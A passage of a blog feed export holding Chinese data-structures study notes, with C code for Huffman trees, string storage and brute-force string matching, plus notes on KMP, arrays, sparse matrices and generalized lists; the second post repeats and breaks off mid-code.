class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdlib.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ElemType int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OVERFLOW (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CHUNKSIZE 80</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdlib.h&quot;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">HTNode</span> &#123;</span><br>    <span class="hljs-type">int</span> weight;<br>    <span class="hljs-type">int</span> parent, lch, rch;<br>&#125; HTNode, *HuffmanTree;<br><span class="hljs-comment">//采用双亲表示法，但是会记录左右孩子的位置</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Select</span><span class="hljs-params">(HTNode *htNodes, <span class="hljs-type">int</span> size, <span class="hljs-type">int</span> *min1, <span class="hljs-type">int</span> *min2)</span> &#123;<br>    <span class="hljs-comment">//以下算法用于去出较次和最次的元素</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; ++i) &#123;<br>        <span class="hljs-keyword">if</span> ((htNodes + i)-&gt;parent == <span class="hljs-number">0</span><br>            &amp;&amp; (htNodes + i)-&gt;weight &lt; (htNodes + *min1)-&gt;weight) &#123;<span class="hljs-comment">//确保每小权的结点已经被选用</span><br><br>            *min2 = *min1;<br>            *min1 = i;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((htNodes + i)-&gt;parent == <span class="hljs-number">0</span><br>                   &amp;&amp; (htNodes + i)-&gt;weight &lt; (htNodes + *min2)-&gt;weight<br>                   &amp;&amp; i != *min1) &#123;<br><br>            *min2 = i;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">initMin</span><span class="hljs-params">(HTNode* htNodes,<span class="hljs-type">int</span> size,<span class="hljs-type">int</span> *min1,<span class="hljs-type">int</span> *min2)</span>&#123;<br>    <span class="hljs-comment">//重置最小值，防止取出来的最小值是已经被选过的</span><br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (; i &lt; size; ++i) &#123;<br>        <span class="hljs-keyword">if</span>((htNodes+i)-&gt;parent==<span class="hljs-number">0</span>)&#123;<br>            *min1=i++;<span class="hljs-comment">//break使得++i失效</span><br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(;i&lt;size;++i)&#123;<br>        <span class="hljs-keyword">if</span>((htNodes+i)-&gt;parent==<span class="hljs-number">0</span>)&#123;<br>            *min2=i;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br>status <span class="hljs-title function_">creatNode</span><span class="hljs-params">(HTNode *htNodes, <span class="hljs-type">int</span> *nums, <span class="hljs-type">int</span> size)</span> &#123;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> min1 = <span class="hljs-number">0</span>, min2 = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> size1;<br>    size1 = size * <span class="hljs-number">2</span> - <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">//</span><br>    <span class="hljs-keyword">for</span> (; i&lt;size; ++i) &#123;<br>        (htNodes + i)-&gt;weight = *(nums + i);<br>        (htNodes + i)-&gt;lch = <span class="hljs-number">0</span>;<br>        (htNodes + i)-&gt;rch = <span class="hljs-number">0</span>;<br>        (htNodes + i)-&gt;parent = <span class="hljs-number">0</span>;<span class="hljs-comment">//一定要将parent重置为0</span><br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (; i &lt; size1 ; ++i) &#123;<br>        initMin(htNodes,i,&amp;min1,&amp;min2);<br>        Select(htNodes, i, &amp;min1, &amp;min2);<br>        (htNodes + i)-&gt;weight = (htNodes + min1)-&gt;weight + (htNodes + min2)-&gt;weight;<br>        (htNodes + i)-&gt;lch = min1;<br>        (htNodes + i)-&gt;rch = min2;<br>        (htNodes + i)-&gt;parent = <span class="hljs-number">0</span>;<br>        (htNodes + min1)-&gt;parent = i;<br>        (htNodes + min2)-&gt;parent = i;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> num;<br>    <span class="hljs-type">int</span> nums[<span class="hljs-number">100</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> tem;<br>    HTNode htNodes[<span class="hljs-number">100</span>] = &#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-comment">//注意这里使用变量，不使用指针</span><br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;num);<span class="hljs-comment">//num最大是5，因为，2n-1留一个0不用</span><br><span class="hljs-comment">/*    if(num&gt;5)&#123;</span><br><span class="hljs-comment">        printf(&quot;num too large&quot;);</span><br><span class="hljs-comment">        exit(-1);</span><br><span class="hljs-comment">    &#125;*/</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;tem);<br>        nums[i] = tem;<br>    &#125;<br>    creatNode(htNodes, nums, num);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span>*num<span class="hljs-number">-1</span>; ++i) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,htNodes[i].weight);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></li></ol><h4 id="哈曼树的运用"><a href="#哈曼树的运用" class="headerlink" title="哈曼树的运用"></a>哈曼树的运用</h4><h5 id="哈夫曼编码"><a href="#哈夫曼编码" class="headerlink" title="哈夫曼编码"></a>哈夫曼编码</h5><ol><li><p>设计一种任意的编码都不是另一个编码的前缀</p><p>如A(0)是B(00)的前缀</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%93%88%E5%A4%AB%E6%9B%BC%E7%BC%96%E7%A0%81.png"></p></li><li><p>通过哈夫曼编码使得电文最短</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%A6%82%E4%BD%95%E4%BD%BF%E5%BE%97%E7%94%B5%E6%96%87%E7%9A%84%E6%9C%80%E7%9F%AD.png"></p><p>将要传输的字符出现的频率当作权值</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%A6%82%E4%BD%95%E4%BD%BF%E5%BE%97%E7%94%B5%E6%96%87%E7%9A%84%E6%9C%80%E7%9F%AD.png"></p></li><li><p>问题</p><ul><li><p>为什么哈夫曼编码能确保不是前缀编码？</p><blockquote><p>因为每一个字符都是叶子结点，也就是说，没有哪个叶子是另个一个叶子的前缀，也就是没有相同的路径</p></blockquote></li><li><p>为什么哈夫曼树能确保字符编码总长最短？</p><blockquote><p>才用权的方式，权重大的离根节点更近，所以形成的编码最短。换句话说哈夫曼树的加权路径最短</p></blockquote></li></ul></li><li><p>性质</p><ul><li>哈夫曼编码是前缀码</li><li>而且是最有前缀码</li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>数据结构和算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>串、数组和广义表</title>
    <link href="/2023/04/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E5%92%8C%E5%B9%BF%E4%B9%89%E8%A1%A8/"/>
    <url>/2023/04/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E5%92%8C%E5%B9%BF%E4%B9%89%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="串、数组和广义表"><a href="#串、数组和广义表" class="headerlink" title="串、数组和广义表"></a>串、数组和广义表</h1><h2 id="串（字符串string）"><a href="#串（字符串string）" class="headerlink" title="串（字符串string）"></a>串（字符串string）</h2><ol><li><p>是一个内容受限的线性表（只能存放字符）</p></li><li><p>子串</p><p>例如<code>abcd</code>的的子串</p><p>“ ”  “a”  “ab”  ……..</p></li><li><p>子串在主串当中的位置</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%AD%90%E4%B8%B2%E5%9C%A8%E4%B8%BB%E4%B8%B2%E7%9A%84%E4%BD%8D%E7%BD%AE.png"></p></li><li><p>所有的空串都是相等的 </p></li><li><p>一般选用顺序的</p></li></ol><h3 id="串的顺序实现"><a href="#串的顺序实现" class="headerlink" title="串的顺序实现"></a>串的顺序实现</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">SString</span>&#123;</span><br>    <span class="hljs-type">char</span> ch[MAXSIZE];<br>    <span class="hljs-type">int</span> Length;<br>&#125;SString;<br></code></pre></td></tr></table></figure><h3 id="串的链式实现"><a href="#串的链式实现" class="headerlink" title="串的链式实现"></a>串的链式实现</h3><ol><li><p>优点</p><blockquote><p>操作方便</p></blockquote></li><li><p>缺点</p><blockquote><p>存储密度较低 </p></blockquote><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E5%92%8C%E5%B9%BF%E4%B9%89%E8%A1%A8/%E4%B8%B2%E7%9A%84%E4%BC%98%E7%82%B9%E5%92%8C%E7%BC%BA%E7%82%B9.png"></p></li><li><p>块链的是实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Chunk</span>&#123;</span><br>    <span class="hljs-type">char</span> ch[CHUNKSIZE];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Chunk</span>* <span class="hljs-title">next</span>;</span><br>&#125;Chunk;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LString</span>&#123;</span><br>    Chunk *head,*tail;<br>    <span class="hljs-type">int</span> curlen;<br>&#125;LString;<br></code></pre></td></tr></table></figure></li></ol><h3 id="串的模式匹配算法"><a href="#串的模式匹配算法" class="headerlink" title="串的模式匹配算法"></a>串的模式匹配算法</h3><h3 id="BF算法"><a href="#BF算法" class="headerlink" title="BF算法"></a>BF算法</h3><ol><li><p>时间复杂度为<code>O(n*m)</code></p></li><li><p>代码示例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">SString</span> &#123;</span><br>    <span class="hljs-type">char</span> ch[MAXSIZE];<br>    <span class="hljs-type">int</span> Length;<br>&#125; SString;<br><br>status <span class="hljs-title function_">InitString</span><span class="hljs-params">(SString *<span class="hljs-built_in">string</span>)</span> &#123;<br>    <span class="hljs-built_in">memset</span>(<span class="hljs-built_in">string</span>-&gt;ch, <span class="hljs-number">0</span>, MAXSIZE);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, <span class="hljs-built_in">string</span>-&gt;ch);<br>    <span class="hljs-built_in">string</span>-&gt;Length = <span class="hljs-built_in">strlen</span>(<span class="hljs-built_in">string</span>-&gt;ch);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">BFMatchingAlorithm</span><span class="hljs-params">(SString *<span class="hljs-built_in">string</span>, <span class="hljs-type">char</span> *str)</span> &#123;<br>    <span class="hljs-type">int</span> len = <span class="hljs-built_in">string</span>-&gt;Length;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (i &lt; <span class="hljs-built_in">string</span>-&gt;Length &amp;&amp; j &lt; <span class="hljs-built_in">strlen</span>(str)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>-&gt;ch[i] == str[j]) &#123;<br>            ++i;<br>            ++j;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            i = i - j + <span class="hljs-number">1</span>;<br>            j = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (j == <span class="hljs-built_in">strlen</span>(str)) &#123;<br>        <span class="hljs-keyword">return</span> i - j;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><span class="hljs-comment">/*    for (int i = 0,j=0; i &lt; len; ++i) &#123;</span><br><span class="hljs-comment">        if(string-&gt;ch[i]==str[j])&#123;</span><br><span class="hljs-comment">            while(j&lt; strlen(str)&amp;&amp;string-&gt;ch[i]!=&#x27;\0&#x27;)&#123;</span><br><span class="hljs-comment">                if(string-&gt;ch[i]!=str[j])&#123;</span><br><span class="hljs-comment">                    i=i-j+1;</span><br><span class="hljs-comment">                    j=0;</span><br><span class="hljs-comment">                    break;</span><br><span class="hljs-comment">                &#125;</span><br><span class="hljs-comment">                i++;</span><br><span class="hljs-comment">                j++;</span><br><span class="hljs-comment">            &#125;</span><br><span class="hljs-comment">            if(j== strlen(str))&#123;</span><br><span class="hljs-comment">                return i-j;</span><br><span class="hljs-comment">            &#125;</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    return -1;*/</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    SString <span class="hljs-built_in">string</span>;<br>    <span class="hljs-type">int</span> sub = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> str[<span class="hljs-number">10</span>];<br>    InitString(&amp;<span class="hljs-built_in">string</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, str);<br>    sub = BFMatchingAlorithm(&amp;<span class="hljs-built_in">string</span>, str);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, sub);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>注意事项</p><ul><li>注意回溯的<code>i</code>的计算公式</li></ul></li></ol><h3 id="KMP算法"><a href="#KMP算法" class="headerlink" title="KMP算法"></a>KMP算法</h3><ol><li><p>计算<code>next</code>的值</p><ul><li>第一个元素<code>next</code>为<code>0</code></li><li>第二个元素<code>next</code>比较前面一个元素，就是<code>1</code></li><li>其他元素比较前缀的子串</li></ul><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E5%92%8C%E5%B9%BF%E4%B9%89%E8%A1%A8/KMP%E7%AE%97%E6%B3%95%E7%9A%84next%E5%80%BC%E7%9A%84%E8%BF%90%E7%AE%97.png"></p></li><li></li></ol><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><ol><li><p>定长的线性表</p></li><li><p>相同的元素</p></li><li></li><li><p>结构是固定</p></li><li><p>三维数组的存储</p><p>例如<code>arr[i][j][k]</code></p><ul><li><p><code>arr[x][y][z]</code></p><p>意思就是说，第<code>z</code>页的第<code>x,y</code>号元素</p><p>内存为<code>arr+z*x*y+x*y+y</code></p></li></ul></li><li><p>稀疏矩阵的存储</p><p>采用三元法(i,j,元素)</p><p>既是只存放有元素的位置</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E5%92%8C%E5%B9%BF%E4%B9%89%E8%A1%A8/%E4%B8%89%E5%85%83%E7%BB%84%E6%B3%95%E4%BC%98%E7%BC%BA%E7%82%B9.png"></p></li><li><p>三角矩阵</p><p>采用的是存一边的方法</p></li><li><p>对称矩阵</p><p>采用三角矩阵的存法</p></li></ol><h2 id="广义表"><a href="#广义表" class="headerlink" title="广义表"></a>广义表</h2><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E5%92%8C%E5%B9%BF%E4%B9%89%E8%A1%A8/%E5%B9%BF%E4%B9%89%E8%A1%A8.png"></p><ol><li><p>每个元素可以不同</p></li><li><p>一般用大写的字母表示广义表，小写的字母表示表的元素</p></li><li><p>递归的广义表</p></li><li><p>广义表的深度</p><p>可以大概理解为，完整括号的个数</p></li><li><p>广义表的性质</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E5%92%8C%E5%B9%BF%E4%B9%89%E8%A1%A8/%E5%B9%BF%E4%B9%89%E8%A1%A8.png"></p></li><li><p>广义表的种类</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E5%92%8C%E5%B9%BF%E4%B9%89%E8%A1%A8/%E5%B9%BF%E4%B9%89%E8%A1%A8.png"></p></li></ol><h2 id="案例分析与实现"><a href="#案例分析与实现" class="headerlink" title="案例分析与实现"></a>案例分析与实现</h2><ol><li><p>病毒感染检测</p><ul><li><p>将病毒的遗传物质变成复制一份（考虑到病毒的遗传物质是环状的）</p></li><li><p>代码示例（病毒DNA是线状的）</p><p>使用BF</p><p>[代码](<a href="https://github.com/TSY244/cpp_test/commit/82838186490cbdfacb47899ecf70487a44ab4e53">病毒匹配bf · TSY244&#x2F;cpp_test@8283818 (github.com)</a>)</p></li></ul><p>，</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>数据结构和算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>串、数组和广义表</title>
    <link href="/2023/04/04/%E7%AE%97%E6%B3%95/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E5%92%8C%E5%B9%BF%E4%B9%89%E8%A1%A8/"/>
    <url>/2023/04/04/%E7%AE%97%E6%B3%95/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E5%92%8C%E5%B9%BF%E4%B9%89%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="串、数组和广义表"><a href="#串、数组和广义表" class="headerlink" title="串、数组和广义表"></a>串、数组和广义表</h1><h2 id="串（字符串string）"><a href="#串（字符串string）" class="headerlink" title="串（字符串string）"></a>串（字符串string）</h2><ol><li><p>是一个内容受限的线性表（只能存放字符）</p></li><li><p>子串</p><p>例如<code>abcd</code>的的子串</p><p>“ ”  “a”  “ab”  ……..</p></li><li><p>子串在主串当中的位置</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%AD%90%E4%B8%B2%E5%9C%A8%E4%B8%BB%E4%B8%B2%E7%9A%84%E4%BD%8D%E7%BD%AE.png"></p></li><li><p>所有的空串都是相等的 </p></li><li><p>一般选用顺序的</p></li></ol><h3 id="串的顺序实现"><a href="#串的顺序实现" class="headerlink" title="串的顺序实现"></a>串的顺序实现</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">SString</span>&#123;</span><br>    <span class="hljs-type">char</span> ch[MAXSIZE];<br>    <span class="hljs-type">int</span> Length;<br>&#125;SString;<br></code></pre></td></tr></table></figure><h3 id="串的链式实现"><a href="#串的链式实现" class="headerlink" title="串的链式实现"></a>串的链式实现</h3><ol><li><p>优点</p><blockquote><p>操作方便</p></blockquote></li><li><p>缺点</p><blockquote><p>存储密度较低 </p></blockquote><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E5%92%8C%E5%B9%BF%E4%B9%89%E8%A1%A8/%E4%B8%B2%E7%9A%84%E4%BC%98%E7%82%B9%E5%92%8C%E7%BC%BA%E7%82%B9.png"></p></li><li><p>块链的是实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Chunk</span>&#123;</span><br>    <span class="hljs-type">char</span> ch[CHUNKSIZE];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Chunk</span>* <span class="hljs-title">next</span>;</span><br>&#125;Chunk;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LString</span>&#123;</span><br>    Chunk *head,*tail;<br>    <span class="hljs-type">int</span> curlen;<br>&#125;LString;<br></code></pre></td></tr></table></figure></li></ol><h3 id="串的模式匹配算法"><a href="#串的模式匹配算法" class="headerlink" title="串的模式匹配算法"></a>串的模式匹配算法</h3><h3 id="BF算法"><a href="#BF算法" class="headerlink" title="BF算法"></a>BF算法</h3><ol><li><p>时间复杂度为<code>O(n*m)</code></p></li><li><p>代码示例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">SString</span> &#123;</span><br>    <span class="hljs-type">char</span> ch[MAXSIZE];<br>    <span class="hljs-type">int</span> Length;<br>&#125; SString;<br><br>status <span class="hljs-title function_">InitString</span><span class="hljs-params">(SString *<span class="hljs-built_in">string</span>)</span> &#123;<br>    <span class="hljs-built_in">memset</span>(<span class="hljs-built_in">string</span>-&gt;ch, <span class="hljs-number">0</span>, MAXSIZE);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, <span class="hljs-built_in">string</span>-&gt;ch);<br>    <span class="hljs-built_in">string</span>-&gt;Length = <span class="hljs-built_in">strlen</span>(<span class="hljs-built_in">string</span>-&gt;ch);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">BFMatchingAlorithm</span><span class="hljs-params">(SString *<span class="hljs-built_in">string</span>, <span class="hljs-type">char</span> *str)</span> &#123;<br>    <span class="hljs-type">int</span> len = <span class="hljs-built_in">string</span>-&gt;Length;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (i &lt; <span class="hljs-built_in">string</span>-&gt;Length &amp;&amp; j &lt; <span class="hljs-built_in">strlen</span>(str)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>-&gt;ch[i] == str[j]) &#123;<br>            ++i;<br>            ++j;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            i = i - j + <span class="hljs-number">1</span>;<br>            j = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (j == <span class="hljs-built_in">strlen</span>(str)) &#123;<br>        <span class="hljs-keyword">return</span> i - j;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><span class="hljs-comment">/*    for (int i = 0,j=0; i &lt; len; ++i) &#123;</span><br><span class="hljs-comment">        if(string-&gt;ch[i]==str[j])&#123;</span><br><span class="hljs-comment">            while(j&lt; strlen(str)&amp;&amp;string-&gt;ch[i]!=&#x27;\0&#x27;)&#123;</span><br><span class="hljs-comment">                if(string-&gt;ch[i]!=str[j])&#123;</span><br><span class="hljs-comment">                    i=i-j+1;</span><br><span class="hljs-comment">                    j=0;</span><br><span class="hljs-comment">                    break;</span><br><span class="hljs-comment">                &#125;</span><br><span class="hljs-comment">                i++;</span><br><span class="hljs-comment">                j++;</span><br><span class="hljs-comment">            &#125;</span><br><span class="hljs-comment">            if(j== strlen(str))&#123;</span><br><span class="hljs-comment">                return i-j;</span><br><span class="hljs-comment">            &#125;</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    return -1;*/</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    SString <span class="hljs-built_in">string</span>;<br>    <span class="hljs-type">int</span> sub = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> str[<span class="hljs-number">10</span>];<br>    InitString(&amp;<span class="hljs-built_in">string</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, str);<br>    sub = BFMatchingAlorithm(&amp;<span class="hljs-built_in">string</span>, str);<br>    <span 